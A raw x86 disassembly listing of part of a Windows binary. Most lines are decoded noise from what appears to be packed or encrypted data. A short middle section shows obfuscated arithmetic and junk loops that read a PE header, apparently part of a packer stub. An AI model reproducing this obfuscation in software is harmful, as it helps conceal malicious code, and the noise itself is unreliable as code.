  417a30:	mov    ds:0x94a6c759,eax
  417a35:	or     ah,BYTE PTR [edx+0x6b478001]
  417a3b:	jmp    0x3763:0xbcf5aa38
  417a42:	add    BYTE PTR [ebx+0x51],ch
  417a45:	pop    ebx
  417a46:	test   BYTE PTR [ebp+esi*1-0x28],ch
  417a4a:	(bad)  
  417a4b:	mov    ch,0x6f
  417a4d:	loop   0x417a45
  417a4f:	jno    0x417a36
  417a51:	mov    ebx,0x44c211b5
  417a56:	or     ebp,0xffffff83
  417a59:	pop    esp
  417a5a:	sub    BYTE PTR [ecx-0x5],dl
  417a5d:	mov    ebx,0xb39235b3
  417a62:	addr16 hlt 
  417a64:	outs   dx,DWORD PTR ds:[esi]
  417a65:	(bad)  
  417a66:	addr16 (bad) 
  417a68:	cld    
  417a69:	mov    dl,0xc0
  417a6b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417a6c:	mov    edi,0x5debf6f6
  417a71:	lods   eax,DWORD PTR ds:[esi]
  417a72:	ffree  st(0)
  417a74:	mov    al,ds:0x25fa7a21
  417a79:	xor    bl,dh
  417a7b:	aad    0x2c
  417a7d:	fcomp  DWORD PTR [esi-0x6]
  417a80:	aad    0x10
  417a82:	cmc    
  417a83:	popf   
  417a84:	sbb    cl,BYTE PTR [esi]
  417a86:	sub    esi,eax
  417a88:	jmp    0x8fba2e75
  417a8d:	adc    BYTE PTR [edi],bl
  417a8f:	cdq    
  417a90:	in     al,0x37
  417a92:	jge    0x417ace
  417a94:	imul   DWORD PTR [ebx+0x6b]
  417a97:	pop    ebx
  417a98:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417a9a:	adc    eax,0x4e41f68
  417a9f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417aa0:	sar    dh,cl
  417aa2:	lahf   
  417aa3:	sbb    ecx,esi
  417aa5:	jg     0x417a5c
  417aa7:	mov    dl,0x67
  417aa9:	mov    cl,0x43
  417aab:	idiv   BYTE PTR [edx-0x18]
  417aae:	push   ebx
  417aaf:	adc    eax,0x5267438e
  417ab4:	gs into 
  417ab6:	jl     0x417aff
  417ab8:	or     edi,edi
  417aba:	pop    ecx
  417abb:	xor    al,BYTE PTR [ecx-0x4]
  417abe:	call   0xfb24:0x2e9a3885
  417ac5:	popf   
  417ac6:	pop    ebp
  417ac7:	or     cl,BYTE PTR [ebx-0x78]
  417aca:	xchg   esp,eax
  417acb:	add    ebx,esp
  417acd:	out    dx,al
  417ace:	imul   ecx,DWORD PTR [eax+0x15656fab],0x56
  417ad5:	or     dl,BYTE PTR [ebx+ebx*1]
  417ad8:	into   
  417ad9:	xchg   ecx,eax
  417ada:	pop    edx
  417adb:	mov    dl,0x2b
  417add:	dec    esi
  417ade:	sbb    eax,0x72683b88
  417ae3:	out    dx,eax
  417ae4:	out    dx,al
  417ae5:	push   es
  417ae6:	dec    ebx
  417ae7:	mov    ds:0xbf59ac22,eax
  417aec:	bound  ebx,QWORD PTR [esi-0x77]
  417aef:	sub    BYTE PTR [ecx],al
  417af1:	mov    ch,0x48
  417af3:	dec    edi
  417af4:	jmp    0xadaf:0xef4b2275
  417afb:	out    dx,eax
  417afc:	mov    esi,0x847a77f2
  417b01:	jo     0x417a92
  417b03:	rcr    bh,1
  417b05:	scas   al,BYTE PTR es:[edi]
  417b06:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417b07:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417b08:	test   al,0x3f
  417b0a:	jbe    0x417b5b
  417b0c:	stos   DWORD PTR es:[edi],eax
  417b0d:	dec    esp
  417b0e:	xor    eax,0x83cf6838
  417b13:	or     eax,0x971fc79b
  417b18:	dec    edx
  417b19:	pop    es
  417b1a:	repnz adc eax,0xf6cd627e
  417b20:	(bad)  
  417b21:	jb     0x417b93
  417b23:	lods   eax,DWORD PTR ds:[esi]
  417b24:	fcmovne st,st(5)
  417b26:	jne    0x417b88
  417b28:	fstp   DWORD PTR [edi+0x2e6077bc]
  417b2e:	inc    esp
  417b2f:	sub    al,0xbf
  417b31:	mov    bl,0x77
  417b33:	mov    dh,0xee
  417b35:	mov    ecx,0x380d4ad0
  417b3a:	in     al,0xdd
  417b3c:	lea    esp,[edi-0x2b]
  417b3f:	(bad)  
  417b40:	rcl    DWORD PTR ds:0xb63b112,cl
  417b46:	mov    bl,0x4d
  417b48:	fisubr DWORD PTR [ecx+0x7c]
  417b4b:	int    0xa0
  417b4d:	int    0x85
  417b4f:	ins    BYTE PTR es:[edi],dx
  417b50:	hlt    
  417b51:	call   edx
  417b53:	mov    ecx,0x78dfee85
  417b58:	inc    ecx
  417b59:	stc    
  417b5a:	jge    0x417bdb
  417b5c:	call   0xb61c:0xb7aee0bf
  417b63:	mov    ds:0x2aded355,eax
  417b68:	in     al,0xb
  417b6a:	repz cmp ebp,ecx
  417b6d:	lods   al,BYTE PTR ds:[esi]
  417b6e:	pop    ebx
  417b6f:	mov    al,ds:0x434efa2a
  417b74:	mov    al,ds:0x7cffbcc4
  417b79:	or     BYTE PTR [esi+ecx*4+0x45],dh
  417b7d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417b7e:	sbb    al,bh
  417b80:	aam    0xb3
  417b82:	or     DWORD PTR [edx-0xdadda3a],esp
  417b88:	ins    DWORD PTR es:[edi],dx
  417b89:	imul   ebp,DWORD PTR [ebx+ecx*1-0x4662d8c6],0x9b099b86
  417b94:	sbb    DWORD PTR [ecx+edx*2],0xa226fb5d
  417b9b:	sub    eax,0x3bc53cfd
  417ba0:	cli    
  417ba1:	(bad)  
  417ba2:	frstor [edi+0x5c]
  417ba5:	mov    esp,0xdc11378
  417baa:	out    dx,eax
  417bab:	push   ebp
  417bac:	out    dx,eax
  417bad:	mov    eax,0x23e45855
  417bb2:	mov    cl,0xc0
  417bb4:	xor    eax,DWORD PTR [esi-0x12]
  417bb7:	or     bl,BYTE PTR [ebx+edx*2]
  417bba:	out    0x72,al
  417bbc:	adc    ebx,DWORD PTR [edi+0x3b]
  417bbf:	add    DWORD PTR [esi-0x2a],0x44f5c2a9
  417bc6:	and    al,0xba
  417bc8:	pop    edi
  417bc9:	mov    ebx,0xa20340e9
  417bce:	inc    edi
  417bcf:	and    eax,0x73670e64
  417bd4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417bd5:	sbb    al,0x3e
  417bd7:	cli    
  417bd8:	aam    0x46
  417bda:	inc    edx
  417bdb:	imul   esp,eax,0xa427d2a8
  417be1:	sub    ebx,esp
  417be3:	push   edx
  417be4:	xor    BYTE PTR [esi-0x4d],0xfc
  417be8:	mov    bh,0xfd
  417bea:	js     0x417bff
  417bec:	jle    0x417bcb
  417bee:	stos   BYTE PTR es:[edi],al
  417bef:	pop    esi
  417bf0:	mov    ah,0xe2
  417bf2:	stc    
  417bf3:	pop    edx
  417bf4:	and    eax,0x1482b421
  417bf9:	jae    0x417c50
  417bfb:	(bad)  
  417bfc:	jg     0x417c35
  417bfe:	call   0xd063b8d6
  417c03:	mov    al,BYTE PTR [esi+ebx*2+0x64]
  417c07:	xchg   edi,eax
  417c08:	test   eax,0xc0d30049
  417c0d:	mov    al,ds:0xa2bc1b20
  417c12:	xor    eax,0xfbc4cf59
  417c17:	in     eax,dx
  417c18:	lahf   
  417c19:	lock mov bh,0x23
  417c1c:	xor    al,0xa9
  417c1e:	xchg   esp,eax
  417c1f:	fnsave [edi+0x29]
  417c22:	pop    esi
  417c23:	jo     0x417bcd
  417c25:	ds scas al,BYTE PTR es:[edi]
  417c27:	and    DWORD PTR [eax-0x7c],edx
  417c2a:	mov    al,ds:0x9b6fae0c
  417c2f:	pop    ecx
  417c30:	lahf   
  417c31:	into   
  417c32:	test   dh,0x3b
  417c35:	cmp    edx,DWORD PTR [eax+eiz*4]
  417c38:	dec    esi
  417c39:	jae    0x417c09
  417c3b:	scas   eax,DWORD PTR es:[edi]
  417c3c:	sbb    dh,0xcc
  417c3f:	xchg   ebp,eax
  417c40:	sbb    al,0x8b
  417c42:	add    dl,BYTE PTR [edx]
  417c44:	shl    BYTE PTR [eax+0x77b06b6c],1
  417c4a:	mov    ah,BYTE PTR es:[esi+0x79]
  417c4e:	ds jno 0x417c8f
  417c51:	mov    WORD PTR [ecx],?
  417c53:	loope  0x417bf9
  417c55:	jmp    0x67fca16e
  417c5a:	mov    ch,0x4f
  417c5c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417c5d:	xchg   ebp,eax
  417c5e:	inc    edi
  417c5f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417c60:	std    
  417c61:	les    ebp,FWORD PTR [ecx-0x1da1e35b]
  417c67:	jnp    0x417c1b
  417c69:	sbb    edx,ecx
  417c6b:	stos   BYTE PTR es:[edi],al
  417c6c:	pop    eax
  417c6d:	leave  
  417c6e:	cwde   
  417c6f:	jne    0x417c3d
  417c71:	cmp    edi,ebx
  417c73:	(bad)  
  417c74:	mov    esp,0xeaa2b3b
  417c79:	cmp    eax,DWORD PTR [ebx]
  417c7b:	cmp    al,0x56
  417c7d:	jecxz  0x417c5a
  417c7f:	(bad)  
  417c80:	mov    ebp,0xda0787ab
  417c85:	or     eax,0xd70eab69
  417c8a:	adc    dh,BYTE PTR [esi]
  417c8c:	jmp    0x330b6abc
  417c91:	outs   dx,BYTE PTR ds:[esi]
  417c92:	push   esi
  417c93:	push   ds
  417c94:	cmp    esp,DWORD PTR [esi+edi*2-0x35f0d5b4]
  417c9b:	mov    BYTE PTR [edi-0x5f1812c],ah
  417ca1:	pop    esi
  417ca2:	pop    ds
  417ca3:	shl    DWORD PTR [ecx+0x49],cl
  417ca6:	lods   al,BYTE PTR ds:[esi]
  417ca7:	adc    al,0x91
  417caa:	or     DWORD PTR [edx+0x6507c12f],ebp
  417cb0:	mov    ds:0xdacbf628,al
  417cb5:	mov    esi,0x3cb7df84
  417cba:	xlat   BYTE PTR ds:[ebx]
  417cbb:	ds retf 
  417cbd:	mov    ecx,0xc5354b39
  417cc2:	js     0x417c53
  417cc4:	lds    edi,FWORD PTR [ebx]
  417cc6:	push   ebx
  417cc7:	pop    eax
  417cc8:	jmp    0x417d11
  417cca:	stos   BYTE PTR es:[edi],al
  417ccb:	or     edi,eax
  417ccd:	xchg   esp,eax
  417cce:	jl     0x417cb7
  417cd0:	push   esp
  417cd1:	ror    BYTE PTR [esi-0x2596bbb8],cl
  417cd7:	(bad)  
  417cd8:	xor    eax,0x62af9b31
  417cdd:	add    bl,0x13
  417ce0:	adc    al,0x26
  417ce2:	out    0xf1,al
  417ce4:	or     ah,BYTE PTR [edx+edx*4-0x1cb46315]
  417ceb:	pop    ss
  417cec:	inc    eax
  417ced:	fcom   QWORD PTR ds:0x97a77e2b
  417cf3:	lea    eax,[ebp-0x19f83be3]
  417cf9:	xchg   ebp,eax
  417cfa:	mov    WORD PTR es:[ebx+0x54],?
  417cfe:	test   DWORD PTR [ecx-0x5],eax
  417d01:	pop    ebp
  417d02:	add    DWORD PTR [ecx+0x75],ebp
  417d05:	inc    esi
  417d06:	dec    edx
  417d07:	xchg   edx,eax
  417d08:	jno    0x417c95
  417d0a:	sbb    BYTE PTR [esi-0x6],dh
  417d0d:	lock imul ecx,DWORD PTR ds:0x34645255,0x8f365095
  417d18:	jg     0x417d7c
  417d1a:	mov    al,ds:0x4157fbe9
  417d1f:	adc    edx,DWORD PTR [ebx+0x343021c3]
  417d25:	mov    esi,0xdbdb5d80
  417d2a:	pop    eax
  417d2b:	in     eax,dx
  417d2c:	stos   DWORD PTR es:[edi],eax
  417d2d:	cmp    ecx,DWORD PTR [eax+0x41]
  417d30:	mov    BYTE PTR [edx-0x4b263be4],ch
  417d36:	cwde   
  417d37:	stc    
  417d38:	dec    ebp
  417d39:	(bad)  
  417d3a:	aaa    
  417d3b:	xor    eax,0xe735f4fc
  417d40:	sub    DWORD PTR gs:[ecx-0x17],eax
  417d44:	sub    eax,0x24ace303
  417d49:	lods   eax,DWORD PTR ds:[esi]
  417d4a:	dec    esi
  417d4b:	loopne 0x417d25
  417d4d:	mov    bl,0x73
  417d4f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417d50:	xchg   ebp,eax
  417d51:	mov    BYTE PTR [esi],ah
  417d53:	mov    eax,0x2a8160a1
  417d58:	call   0xa0164d1a
  417d5d:	sbb    esi,DWORD PTR [edx-0x18]
  417d60:	out    dx,eax
  417d61:	fmul   DWORD PTR [eax-0x66]
  417d64:	aad    0x6a
  417d66:	pop    DWORD PTR [eax+ebx*1]
  417d69:	loope  0x417db6
  417d6b:	imul   eax,DWORD PTR [ebp+0x48],0x2f
  417d6f:	jmp    0x417d03
  417d71:	push   0xd0db9f39
  417d76:	pop    es
  417d77:	test   eax,0x2192ff7f
  417d7c:	sbb    esi,DWORD PTR [ebx+0x57]
  417d7f:	push   edi
  417d80:	sbb    dh,0x1b
  417d83:	inc    ebp
  417d84:	fisttp QWORD PTR [eax-0x3ea91a74]
  417d8a:	mov    ch,0x35
  417d8c:	and    ecx,esp
  417d8e:	jae    0x417df8
  417d90:	pop    edi
  417d91:	pop    ecx
  417d92:	mov    esp,0x3f72e06
  417d97:	adc    al,0xa0
  417d99:	test   esi,ebp
  417d9b:	xchg   ecx,eax
  417d9c:	and    DWORD PTR [edx+0x490baf91],ebp
  417da2:	dec    ebx
  417da3:	mov    esp,DWORD PTR [eax]
  417da5:	jecxz  0x417d50
  417da7:	out    0x40,eax
  417da9:	pop    ss
  417daa:	push   ebp
  417dab:	inc    ebp
  417dac:	psubsb mm3,QWORD PTR [esi+0x457672f1]
  417db3:	jmp    0xfa88:0x2725a486
  417dba:	neg    BYTE PTR [edi+0x7]
  417dbd:	push   es
  417dbe:	or     BYTE PTR [ecx-0x27],bh
  417dc1:	fnstenv [ebx-0x5e]
  417dc4:	cmp    eax,DWORD PTR [ebx-0x90a38b6]
  417dca:	jne    0x417d8b
  417dcc:	stos   BYTE PTR es:[edi],al
  417dcd:	pop    ebx
  417dce:	clc    
  417dcf:	cwde   
  417dd0:	(bad)  
  417dd1:	jnp    0x417d60
  417dd3:	xchg   DWORD PTR [ebp-0x31aec69d],edi
  417dd9:	cmp    BYTE PTR [edx-0x80],dl
  417ddc:	sti    
  417ddd:	dec    edi
  417dde:	xchg   edi,eax
  417ddf:	mov    ebp,0x8dd1c1bf
  417de4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417de5:	test   al,0x6c
  417de7:	ret    
  417de8:	adc    ebp,DWORD PTR [esi]
  417dea:	test   eax,0xe4c750bb
  417def:	sbb    al,0xfd
  417df1:	fld    QWORD PTR [esp+eax*8]
  417df4:	ret    
  417df5:	mov    ds:0x23e22cec,al
  417dfa:	mov    esi,0x51c63839
  417dff:	inc    eax
  417e00:	pop    edx
  417e01:	xchg   esp,eax
  417e02:	dec    edi
  417e03:	pop    ebp
  417e04:	xchg   ebp,eax
  417e05:	ins    BYTE PTR es:[edi],dx
  417e06:	lds    ebx,FWORD PTR [eax+0x37]
  417e09:	or     al,0x5a
  417e0b:	cld    
  417e0c:	mov    eax,0xf4adb363
  417e11:	bound  ebp,QWORD PTR [edi+0x25]
  417e14:	inc    ecx
  417e15:	jb     0x417e16
  417e17:	adc    cl,bh
  417e19:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417e1a:	cwde   
  417e1b:	jb     0x417e49
  417e1d:	test   BYTE PTR [edi],al
  417e1f:	fimul  DWORD PTR ds:0x4613325f
  417e25:	mov    bh,0x84
  417e27:	rcl    ebx,1
  417e29:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417e2b:	test   DWORD PTR [ecx],ecx
  417e2d:	loop   0x417e7e
  417e2f:	sbb    BYTE PTR [ecx+0x4aeca9c1],bh
  417e35:	out    0x60,eax
  417e37:	adc    al,0xf3
  417e39:	and    BYTE PTR [ebx-0x1e],0x79
  417e3d:	dec    esi
  417e3e:	sbb    ch,ch
  417e40:	fwait
  417e41:	pop    ds
  417e42:	xor    BYTE PTR [ebx-0x528cd262],ch
  417e48:	dec    ebp
  417e49:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417e4a:	leave  
  417e4b:	or     eax,0x263b9894
  417e50:	dec    ecx
  417e51:	xchg   ebx,eax
  417e52:	xor    DWORD PTR [ebx+0x1e],ebx
  417e55:	lods   eax,DWORD PTR ds:[esi]
  417e56:	cs jns 0x417e5d
  417e59:	clc    
  417e5a:	mov    esi,0x7c41dfa8
  417e5f:	pusha  
  417e60:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417e61:	cmp    ebx,DWORD PTR [edx+eax*8]
  417e64:	data16 mov bl,0x38
  417e67:	stos   BYTE PTR es:[edi],al
  417e68:	dec    edi
  417e69:	xchg   edi,eax
  417e6a:	arpl   WORD PTR [eax],sp
  417e6c:	jp     0x417e95
  417e6e:	jnp    0x417e10
  417e70:	aas    
  417e71:	test   DWORD PTR [esi+0x6fb72c23],0xa3f3bce7
  417e7b:	mov    ebp,0xf0787459
  417e80:	sub    ch,dl
  417e82:	sub    DWORD PTR [ebx],0xffffff84
  417e85:	jmp    0x417eff
  417e87:	test   esi,eax
  417e89:	repnz and al,0x67
  417e8c:	jp     0x417e70
  417e8e:	stc    
  417e8f:	pop    eax
  417e90:	and    dh,BYTE PTR [ebp+edi*2-0x54]
  417e94:	jecxz  0x417f0f
  417e96:	repz fldcw WORD PTR [ebx-0x1930a3d4]
  417e9d:	popa   
  417e9e:	xchg   ebp,eax
  417e9f:	call   0x949c:0xb2a658f3
  417ea6:	mov    ds:0xc0996aa4,eax
  417eab:	out    0x88,eax
  417ead:	push   edi
  417eae:	pop    ebp
  417eaf:	out    0xb,al
  417eb1:	sahf   
  417eb2:	sub    DWORD PTR [ebx+0x5],esi
  417eb5:	inc    esp
  417eb6:	lods   al,BYTE PTR ds:[esi]
  417eb7:	pop    ss
  417eb8:	mov    edx,0xe74cc8d
  417ebd:	(bad)  
  417ebf:	imul   esp,DWORD PTR [edx],0xffffffdf
  417ec2:	repnz dec ebp
  417ec4:	mov    ch,0x88
  417ec6:	jge    0x417e9f
  417ec8:	retf   
  417ec9:	popf   
  417eca:	mov    BYTE PTR [esp+ecx*2-0x36cb44f7],0x74
  417ed2:	ret    0x67e9
  417ed5:	xchg   ebx,eax
  417ed6:	(bad)  
  417ed8:	arpl   WORD PTR ds:0x195add74,bx
  417ede:	fadd   QWORD PTR [esi+0x256bddcb]
  417ee4:	(bad)  
  417ee5:	mov    BYTE PTR [esi+0x70a333a5],cl
  417eeb:	sahf   
  417eec:	enter  0x233c,0x53
  417ef0:	mov    ds:0x7a39aa12,al
  417ef5:	popa   
  417ef6:	push   cs
  417ef7:	lock mov eax,edi
  417efa:	jae    0x417efb
  417efc:	pop    ebx
  417efd:	es or  eax,0x51e6a9ea
  417f03:	xchg   ebx,eax
  417f04:	inc    esp
  417f05:	jmp    0x33fe:0xd745747c
  417f0c:	mov    esi,0x7cc971dc
  417f11:	or     DWORD PTR [esp+edi*2],esi
  417f14:	inc    esp
  417f15:	mov    DWORD PTR [ebp+ebx*2+0x7b146024],edi
  417f1c:	mov    ebx,0x38c95d71
  417f21:	test   BYTE PTR [esi-0x7eff7565],dh
  417f27:	add    eax,0x429004
  417f2c:	dec    esi
  417f2d:	and    al,0x0
  417f2f:	add    BYTE PTR [ecx*1-0x6febca7f],al
  417f36:	inc    edx
  417f37:	add    BYTE PTR [eax+eiz*2],cl
  417f3a:	inc    edx
  417f3b:	add    BYTE PTR [edi+ebp*2],dh
  417f3e:	mov    DWORD PTR ds:0x427010,0x5834
  417f48:	cmp    al,0x35
  417f4a:	jne    0x417f8f
  417f50:	mov    eax,DWORD PTR [ebp+0x8]
  417f53:	mov    ecx,DWORD PTR [ebp+0x8]
  417f56:	add    ecx,DWORD PTR [eax+0x3c]
  417f59:	mov    edx,0x7510893
  417f5e:	mov    DWORD PTR [ebp+0x8],ecx
  417f61:	mov    eax,DWORD PTR [ebp-0x4]
  417f64:	xor    eax,edx
  417f66:	push   esi
  417f67:	mov    esi,DWORD PTR [ebp+0x8]
  417f6a:	mov    ecx,0x3272db
  417f6f:	add    eax,ecx
  417f71:	cmp    DWORD PTR [esi+0x54],eax
  417f74:	pop    esi
  417f75:	je     0x417f83
  417f7b:	mov    eax,DWORD PTR [ebp+0x8]
  417f7e:	jmp    0x417f9c
  417f83:	mov    eax,DWORD PTR [ebp-0x4]
  417f86:	xor    eax,edx
  417f88:	add    eax,ecx
  417f8a:	jmp    0x417f9c
  417f8f:	mov    eax,DWORD PTR [ebp-0x4]
  417f92:	xor    eax,0x7510893
  417f97:	add    eax,0x3272db
  417f9c:	leave  
  417f9d:	ret    0x4
  417fa0:	push   ebp
  417fa1:	mov    ebp,esp
  417fa3:	push   ecx
  417fa4:	push   ecx
  417fa5:	mov    DWORD PTR ds:0x425024,0x14
  417faf:	cmp    DWORD PTR ds:0x425024,0x0
  417fb6:	je     0x417ff0
  417fbc:	cmp    DWORD PTR ds:0x425024,0x1c
  417fc3:	jne    0x417fdc
  417fc9:	push   DWORD PTR [ebp-0xc]
  417fcc:	push   0x427000
  417fd1:	push   0x4617
  417fd6:	call   DWORD PTR ds:0x421034
  417fdc:	xor    edx,edx
  417fde:	add    edx,DWORD PTR ds:0x425024
  417fe4:	dec    edx
  417fe5:	mov    DWORD PTR ds:0x425024,edx
  417feb:	jmp    0x417faf
  417ff0:	mov    DWORD PTR [ebp-0x8],0xf89c85b6
  417ff7:	mov    DWORD PTR ds:0x428010,0x1b
  418001:	cmp    DWORD PTR ds:0x428010,0x0
  418008:	je     0x41803b
  41800e:	cmp    DWORD PTR ds:0x428010,0x20
  418015:	jne    0x418029
  41801b:	push   DWORD PTR [ebp-0x1c]
  41801e:	push   0x4a52
  418023:	call   DWORD PTR ds:0x421038
  418029:	mov    ecx,DWORD PTR ds:0x428010
  41802f:	dec    ecx
  418030:	mov    DWORD PTR ds:0x428010,ecx
  418036:	jmp    0x418001
  41803b:	mov    DWORD PTR [ebp-0x4],0xf89c85b5
  418042:	mov    eax,DWORD PTR [ebp-0x4]
  418045:	add    edx,0xdc
  41804b:	push   esi
  41804c:	mov    edx,DWORD PTR ds:0x42004b
  418052:	xor    ecx,ecx
  418054:	add    ecx,DWORD PTR ds:0x41d1dc
  41805a:	sub    ecx,edx
  41805c:	and    edx,DWORD PTR [edx+ecx*1]
  41805f:	mov    esi,DWORD PTR [ebp-0x8]
  418062:	add    DWORD PTR ds:0x429010,0x2693
  41806c:	mov    edx,0x7510893
  418071:	xor    eax,edx
  418073:	xor    esi,edx
  418075:	and    DWORD PTR ds:0x42901c,0x0
  41807f:	jmp    0x418091
  418084:	mov    ecx,DWORD PTR ds:0x42901c
  41808a:	inc    ecx
  41808b:	mov    DWORD PTR ds:0x42901c,ecx
  418091:	cmp    DWORD PTR ds:0x42901c,0x17
  418098:	jae    0x4180e3
  41809e:	cmp    DWORD PTR ds:0x42901c,0xb
  4180a5:	jne    0x4180c4
  4180ab:	push   DWORD PTR [ebp-0x10]
  4180ae:	push   0x8d74
  4180b3:	push   0x428004
  4180b8:	push   DWORD PTR [ebp-0x10]
  4180bb:	push   DWORD PTR [ebp-0x14]
  4180be:	call   DWORD PTR ds:0x421000
  4180c4:	cmp    DWORD PTR ds:0x42901c,0xa
  4180cb:	jne    0x4180de
  4180d1:	mov    ecx,DWORD PTR ds:0x42901c
  4180d7:	inc    ecx
  4180d8:	mov    DWORD PTR ds:0x42901c,ecx
  4180de:	jmp    0x418084
  4180e3:	mov    ecx,0x3272db
  4180e8:	add    esi,ecx
  4180ea:	add    eax,ecx
  4180ec:	imul   eax,esi
  4180ef:	mov    esi,DWORD PTR [ebp+0xc]
  4180f2:	cmp    esi,eax
  4180f4:	jne    0x41a4c2
  4180fa:	mov    eax,DWORD PTR [ebp-0x4]
  4180fd:	mov    esi,DWORD PTR [ebp-0x8]
  418100:	xor    eax,edx
  418102:	jmp    0x41a4b4
  418107:	mov    esp,0x2510558f
  41810c:	sub    DWORD PTR fs:[ebx-0x5f],0xffffff83
  418111:	mov    al,0xb8
  418113:	cld    
  418114:	jp     0x4180a1
  418116:	push   esi
  418117:	std    
  418118:	and    al,0x61
  41811a:	(bad)  
  41811b:	int    0x5f
  41811d:	bound  esp,QWORD PTR [edx-0x6f]
  418120:	outs   dx,DWORD PTR gs:[esi]
  418122:	xchg   ebx,eax
  418123:	and    DWORD PTR [edi+ecx*4+0x4e],eax
  418127:	add    edx,DWORD PTR [esi+0x1675fb9]
  41812d:	mov    bh,bl
  41812f:	(bad)  
  418130:	jle    0x41812f
  418132:	mov    cl,0xa3
  418134:	pop    eax
  418135:	push   ecx
  418136:	jno    0x41813b
  418138:	lods   al,BYTE PTR ds:[esi]
  418139:	scas   al,BYTE PTR es:[edi]
  41813a:	ret    0xcb27
  41813d:	xchg   edx,eax
  41813e:	ss jbe 0x41813e
  418141:	or     al,0x7d
  418143:	fstp   QWORD PTR [ebx+0x28]
  418146:	or     BYTE PTR [edi-0x21c6808],dl
  41814c:	mov    esp,0xd7dc154f
  418151:	jmp    0x445d:0x9f2b5dff
  418158:	dec    esp
  418159:	mov    al,ds:0xd5c80a3e
  41815e:	jg     0x418183
  418160:	inc    ecx
  418161:	add    al,0x83
  418163:	arpl   bp,bx
  418165:	dec    eax
  418166:	repnz popa 
  418168:	push   esi
  418169:	aam    0x1e
  41816b:	sbb    ebp,DWORD PTR ds:0xa274a195
  418171:	add    al,0x98
  418173:	pop    edi
  418174:	sub    ch,al
  418176:	and    eax,0xe8ed9a23
  41817b:	mov    fs,ebx
  41817d:	jmp    0x418145
  41817f:	jnp    0x418156
  418181:	sahf   
  418182:	in     eax,0x3d
  418184:	mov    eax,0xd75b27f7
  418189:	cmp    ch,al
  41818b:	jb     0x41817d
  41818d:	fimul  DWORD PTR [edx+0x37]
  418190:	(bad)  
  418192:	sar    BYTE PTR [ecx-0x511781a8],1
  418198:	mov    cl,0x29
  41819a:	mov    ah,bl
  41819c:	mov    cl,0x18
  41819e:	or     eax,0xd80c9aa2
  4181a3:	fcos   
  4181a5:	xor    eax,0xe4e06a0b
  4181aa:	mov    dh,0x93
  4181ac:	outs   dx,BYTE PTR ds:[esi]
  4181ad:	sbb    ecx,DWORD PTR [ecx]
  4181af:	push   ebx
  4181b0:	xor    eax,0xe6afccd6
  4181b5:	mov    esi,0x1d83be43
  4181ba:	sub    DWORD PTR [esi],eax
  4181bc:	ja     0x4181d3
  4181be:	mov    edi,0x7a90889a
  4181c3:	outs   dx,DWORD PTR ds:[esi]
  4181c4:	sub    dh,0xf3
  4181c7:	push   0xbcc6832a
  4181cc:	(bad)  
  4181cd:	sub    ch,al
  4181cf:	mov    ebp,0x7400d2f4
  4181d4:	and    eax,esi
  4181d6:	mov    dl,0x13
  4181d8:	test   al,0xeb
  4181da:	scas   eax,DWORD PTR es:[edi]
  4181db:	sbb    BYTE PTR [ecx+0x33],dh
  4181de:	jns    0x418191
  4181e0:	repnz das 
  4181e2:	xor    DWORD PTR [eax-0x77d8b2a0],eax
  4181e8:	or     DWORD PTR ds:0xb74ce68e,0x1ac2608
  4181f2:	outs   dx,DWORD PTR ds:[esi]
  4181f3:	test   BYTE PTR [ecx+0x256ca3ea],ah
  4181f9:	js     0x418183
  4181fb:	repz fsubr st(5),st
  4181fe:	mov    ah,0xef
  418200:	jmp    0x839a0f6a
  418205:	xchg   ecx,eax
  418206:	cmp    al,0x6f
  418208:	sti    
  418209:	sbb    eax,0xdad4abcb
  41820e:	xchg   ebx,eax
  41820f:	ja     0x418215
  418211:	xchg   esp,eax
  418212:	loope  0x418229
  418214:	dec    edi
  418215:	mov    ecx,DWORD PTR [esi+edi*1]
  418218:	adc    cl,ch
  41821a:	fmul   QWORD PTR [ebp-0x48]
  41821d:	je     0x4181b4
  41821f:	pop    es
  418220:	push   0xffffffa1
  418222:	cld    
  418223:	es push ebp
  418225:	push   edx
  418226:	es into 
  418228:	stos   DWORD PTR es:[edi],eax
  418229:	shl    DWORD PTR [edx+esi*8+0x5920abdb],1
  418230:	add    BYTE PTR [eax+esi*4+0x61],bh
  418234:	mov    eax,ds:0x3ebb7f7b
  418239:	or     DWORD PTR [ebx+0x2d],0x39
  41823d:	out    0x57,al
  41823f:	add    DWORD PTR [eax+0xe3e2808],ecx
  418245:	pop    esp
  418246:	ja     0x4181df
  418248:	fimul  DWORD PTR [edx-0x3b5170ae]
  41824e:	or     eax,0x243d58a4
  418253:	xchg   ebx,eax
  418254:	mov    ch,0x5c
  418256:	test   ecx,ebx
  418258:	(bad)  
  418259:	dec    cx
  41825b:	push   eax
  41825c:	and    eax,0x49c28d7f
  418261:	sbb    bh,ch
  418263:	(bad)  
  418264:	sti    
  418265:	xchg   BYTE PTR [ebx-0x51],bh
  418268:	and    ebx,DWORD PTR [edi+0x78]
  41826b:	inc    ebp
  41826c:	xor    DWORD PTR [edi-0x6e],esp
  41826f:	jle    0x418276
  418271:	cdq    
  418272:	inc    esp
  418273:	mov    ebp,DWORD PTR [ebp-0x11]
  418276:	lock imul ecx,DWORD PTR [eax+0x3c],0xffffffc4
  41827b:	jg     0x4182c9
  41827d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41827e:	call   0xc4bd:0xcc6f0202
  418285:	xor    eax,0xdd490c9
  41828a:	shl    DWORD PTR [ebx+0x15a7d0ba],0xce
  418291:	adc    dh,bl
  418293:	jmp    0x581b0205
  418298:	in     al,dx
  418299:	cmp    BYTE PTR [eax+ebx*4+0x23],al
  41829d:	push   edx
  41829e:	add    BYTE PTR [edi-0x29],ch
  4182a1:	es (bad) gs:[edx+0x4f]
